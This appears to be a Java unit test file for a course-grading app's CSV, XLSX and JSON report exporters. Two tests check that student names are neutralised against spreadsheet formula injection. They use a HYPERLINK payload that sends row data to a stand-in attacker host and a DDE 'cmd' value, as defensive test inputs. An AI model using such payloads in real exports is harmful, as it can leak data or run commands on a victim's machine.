/*
 * Copyright the GitGrader contributors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.gitgrader.reports;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

import static org.assertj.core.api.Assertions.assertThat;

class ReportExporterTest {

	private static final UUID COURSE_ID = UUID.fromString("00000000-0000-0000-0000-000000000001");

	private static final UUID STUDENT_ID = UUID.fromString("00000000-0000-0000-0000-000000000002");

	private static final Clock CLOCK = Clock.fixed(Instant.parse("2026-07-30T12:00:00Z"), ZoneOffset.UTC);

	@Test
	void quotesCsvFieldsContainingCommasQuotesAndNewlines() {
		CourseReport report = report("Lovelace, \"Ada\"\nCountess");

		String csv = new String(new CsvReportExporter().export(report), StandardCharsets.UTF_8);

		assertThat(csv).contains("\"Lovelace, \"\"Ada\"\"\nCountess\"");
	}

	@Test
	void createsReadableXlsxWorkbook() throws IOException {
		CourseReport report = report("Ada Lovelace");

		byte[] bytes = new XlsxReportExporter().export(report);

		try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(bytes))) {
			assertThat(workbook.getSheet("Course report").getRow(1).getCell(2).getStringCellValue())
				.isEqualTo("Ada Lovelace");
		}
	}

	@Test
	void keepsEarnedAndAvailablePointsDistinctInJson() throws IOException {
		// Deliberately different values: an earlier defect reported the earned total in
		// the available-points field, which is invisible whenever a fixture uses the same
		// number for both.
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s1", "Ada Lovelace", 0, 1, 0,
				new BigDecimal("0.70"), new BigDecimal("7"), new BigDecimal("0.70"), new BigDecimal("10"), 1,
				CLOCK.instant(), Map.of());
		CourseReport report = new CourseReport(COURSE_ID, 1, new BigDecimal("10"), List.of(row));

		JsonNode student = new ObjectMapper().readTree(new JsonReportExporter(new ObjectMapper()).export(report))
			.get("students")
			.get(0);

		assertThat(student.get("pointsEarned").decimalValue()).isEqualByComparingTo("7");
		assertThat(student.get("totalPoints").decimalValue()).isEqualByComparingTo("10");
		assertThat(student.get("studentNumber").asString()).isEqualTo("s1");
	}

	@Test
	void serialisesAStudentWhoHasNeverSubmitted() throws IOException {
		// A student with no activity is the ordinary state at the start of a course, so
		// the absent timestamp must serialise rather than fail the whole course export.
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s2", "Grace Hopper", 0, 0, 3, BigDecimal.ZERO,
				BigDecimal.ZERO, BigDecimal.ZERO, new BigDecimal("10"), 0, null, Map.of());

		byte[] json = new JsonReportExporter(new ObjectMapper())
			.export(new CourseReport(COURSE_ID, 3, new BigDecimal("10"), List.of(row)));

		JsonNode student = new ObjectMapper().readTree(json).get("students").get(0);
		assertThat(student.get("lastActivityAt").isNull()).isTrue();
		assertThat(student.get("submissionCount").asLong()).isZero();
	}

	@Test
	void neutralisesASpreadsheetFormulaInAStudentSuppliedName() {
		// Registration is open to anyone and puts no character restriction on a name, so
		// this is what a student can put in the instructor's spreadsheet. Opening the
		// export - which is what an export is for - evaluates it: HYPERLINK and
		// WEBSERVICE reach the network with the row's contents, and DDE has reached the
		// shell. RFC quoting is not a defence, because the spreadsheet strips the quotes
		// and then reads the leading '='. The cell has to arrive as the text it is.
		CourseReport report = report("=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Grades\")");

		String csv = new String(new CsvReportExporter().export(report), StandardCharsets.UTF_8);

		assertThat(csv).doesNotContain(",=HYPERLINK").doesNotContain(",\"=HYPERLINK");
		assertThat(csv).contains("HYPERLINK");
	}

	@Test
	void neutralisesEveryCharacterASpreadsheetTreatsAsAFormula() {
		for (String lead : List.of("=", "+", "-", "@", "\t", "\r")) {
			String csv = new String(new CsvReportExporter().export(report(lead + "cmd|'/c calc'!A0")),
					StandardCharsets.UTF_8);

			assertThat(csv).as("a cell may not begin with %s", lead)
				.doesNotContain("," + lead)
				.doesNotContain(",\"" + lead);
		}
	}

	@Test
	void leavesAnOrdinaryNameAlone() {
		// The guard must not reach names that were never dangerous, or every exported
		// spreadsheet acquires punctuation nobody typed.
		String csv = new String(new CsvReportExporter().export(report("Ada Lovelace")), StandardCharsets.UTF_8);

		assertThat(csv).contains(",Ada Lovelace,");
	}

	private static CourseReport report(String fullName) {
		StudentProgressRow row = new StudentProgressRow(STUDENT_ID, "s1", fullName, 1, 0, 0, BigDecimal.ONE,
				BigDecimal.TEN, BigDecimal.ONE, BigDecimal.TEN, 1, CLOCK.instant(), Map.of());
		return new CourseReport(COURSE_ID, 1, BigDecimal.TEN, List.of(row));
	}

}
